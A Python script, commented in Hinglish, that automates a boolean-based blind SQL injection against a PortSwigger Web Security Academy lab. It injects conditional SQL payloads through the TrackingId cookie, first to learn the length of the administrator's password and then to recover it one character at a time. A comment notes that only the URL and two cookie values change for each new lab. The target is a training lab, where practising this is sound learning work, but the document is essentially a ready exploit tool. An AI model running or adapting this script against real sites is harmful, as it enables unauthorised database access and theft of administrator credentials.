import requests
import string

# ==================== TARGET CONFIGURATION ====================
# Har nayi lab mein sirf ye 3 cheezein change karni hain:
TARGET_URL = "https://0af800b10417f2f0a3eaa03800a1005d.web-security-academy.net/filter?category=Lifestyle"
TRACKING_ID = "PBQhKlk3X603GBO3"
SESSION_ID = "Xn7ydyWuEWNLonQnK7RQJ86npk5DB523"
# ==============================================================

# Brute-force karne ke liye characters (a-z, 0-9)
CHARACTERS = string.ascii_lowercase + string.digits 

def send_request(payload):
    """Database ko request bhej kar check karta hai ki 'Welcome back' aaya ya nahi"""
    cookies = {
        "TrackingId": f"{TRACKING_ID}' {payload}",
        "session": SESSION_ID
    }
    try:
        response = requests.get(TARGET_URL, cookies=cookies, timeout=10)
        
        # Sabsay simple logic: Agar HTML page mein "Welcome back" mil gaya, toh condition TRUE hai
        if "Welcome back!" in response.text:
            return True
            
    except requests.RequestException as e:
        print(f"\n[!] Connection Error: {e}")
    return False

def find_password_length():
    """Step 1: Password ki sahi length pata karna"""
    print("[*] Finding password length...")
    for length in range(1, 31): # 1 se 30 tak check karega
        payload = f"AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = {length}--"
        if send_request(payload):
            print(f"[+] Found! Password length is: {length}\n")
            return length
    print("[-] Could not determine password length.")
    return 0

def extract_password(password_length):
    """Step 2: Ek-ek character brute-force karke password nikalna"""
    print("[*] Extracting password character by character...")
    extracted_password = ""
    
    # Har ek position ke liye (1 se lekar password_length tak)
    for position in range(1, password_length + 1):
        found_char = False
        
        # Har ek possible character ko check karo (a-z, 0-9)
        for char in CHARACTERS:
            payload = f"AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{char}'--"
            
            if send_request(payload):
                extracted_password += char
                print(f"[+] Position {position}: {char} -> Current Password: {extracted_password}")
                found_char = True
                break # Sahi akshar milte hi loop break karo aur agli position par jao
                
        if not found_char:
            print(f"[-] Position {position}: Character not found!")
            extracted_password += "?" # Agar koi character match na ho

    print(f"\n🎉 Success! Final Administrator Password: {extracted_password}")

if __name__ == "__main__":
    # Sabse pehle length dhoondo
    pwd_length = find_password_length()
    
    # Agar length mil gayi, toh brute force shuru karo
    if pwd_length > 0:
        extract_password(pwd_length)
input("\nPress Enter to exit...")